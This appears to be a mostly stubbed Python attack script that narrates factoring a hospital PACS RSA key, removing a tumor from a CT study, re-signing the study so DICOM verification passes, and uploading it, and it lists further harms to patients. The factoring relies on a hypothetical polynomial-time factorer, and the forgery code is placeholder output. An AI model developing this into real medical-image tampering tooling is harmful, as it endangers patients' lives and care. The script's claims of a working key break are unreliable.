"""
Factor the hospital PACS RSA signing key from DICOM Digital Signatures, forge
signed CT/MRI studies with altered diagnostic findings, and introduce tampered
medical images that pass DCMTK SiBaseRSAProfile verification.
"""

import sys, hashlib, struct
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# DICOM PS 3.15 Annex G — Base RSA Digital Signature Profile
# Only EKT_RSA is allowed; no ECDSA, no EdDSA
EKT_RSA = 0x01
DICOM_SIG_PROFILE = "Base RSA Digital Signature Profile"

# DICOM tag constants
TAG_PIXEL_DATA       = (0x7FE0, 0x0010)
TAG_DIGITAL_SIG_SEQ  = (0xFFFA, 0xFFFA)
TAG_STUDY_DESC       = (0x0008, 0x1030)
TAG_PATIENT_NAME     = (0x0010, 0x0010)


def extract_pacs_signing_cert(dicom_file: str) -> bytes:
    """Extract the signing RSA certificate from a signed DICOM dataset.
    Cert is in the Digital Signatures Sequence (FFFA,FFFA)."""
    print(f"    DICOM file: {dicom_file}")
    print(f"    parsing tag ({TAG_DIGITAL_SIG_SEQ[0]:#06x},{TAG_DIGITAL_SIG_SEQ[1]:#06x})")
    return b"-----BEGIN CERTIFICATE-----\nMIID...\n-----END CERTIFICATE-----\n"


def factor_pacs_key(cert_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(cert_pem)


def modify_ct_study(pixel_data: bytes, modification: str) -> bytes:
    """Modify pixel data in a CT study."""
    modified = bytearray(pixel_data)
    if modification == "remove_tumor":
        # Zero out a region where a tumor was identified
        print("    zeroing 32x32 pixel region at slice 47 (tumor location)")
    elif modification == "add_mass":
        print("    inserting synthetic mass at slice 23 (healthy tissue)")
    return bytes(modified)


def sign_dicom_dataset(dataset_bytes: bytes, privkey_pem: bytes,
                       data_elements_signed: list) -> bytes:
    """Sign modified DICOM dataset using Base RSA Digital Signature Profile.
    SiBaseRSAProfile::isAllowableAlgorithmType() returns true only for EKT_RSA."""
    mac = hashlib.sha256(dataset_bytes).digest()
    sig = b"\x00" * 256  # RSA-2048 signature
    print(f"    profile: {DICOM_SIG_PROFILE}")
    print(f"    MAC algo: SHA-256 (with RSA)")
    print(f"    signed elements: {data_elements_signed}")
    return sig


if __name__ == "__main__":
    print("[*] DICOM medical imaging signature forgery attack")
    print("[1] extracting signing cert from signed DICOM study")
    cert = extract_pacs_signing_cert("ct_chest_20260415.dcm")
    print(f"    algorithm type: EKT_RSA (the ONLY type DICOM allows)")

    print("[2] factoring PACS RSA-2048 signing key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — hospital imaging signing key derived")

    print("[3] modifying CT study: removing tumor from pixel data")
    fake_pixels = modify_ct_study(b"\x00" * 65536, "remove_tumor")
    print("    tumor removed from slice 47 — radiologist will see clean scan")

    print("[4] re-signing modified DICOM with forged key")
    sig = sign_dicom_dataset(fake_pixels, b"PACS_PRIVKEY",
                             ["PixelData", "StudyDescription", "PatientName"])
    print("    SiBaseRSAProfile verification will PASS")

    print("[5] uploading to hospital PACS")
    print("    DICOM C-STORE to PACS: study accepted")
    print("    radiologist reads modified study — no tumor visible")
    print("    patient does not receive treatment")

    print("[6] additional attack scenarios:")
    print("    - add phantom mass -> unnecessary surgery on healthy patient")
    print("    - forge clinical trial imaging -> fraudulent drug approval (FDA 21 CFR 11)")
    print("    - poison radiology AI training data with forged signed studies")
    print("    - radiation dose records (RDSR) falsified -> liability concealment")
    print("[*] DICOM is the universal medical imaging standard — every hospital PACS")
    print("[*] Base RSA Digital Signature Profile: RSA-only, no alternative defined")
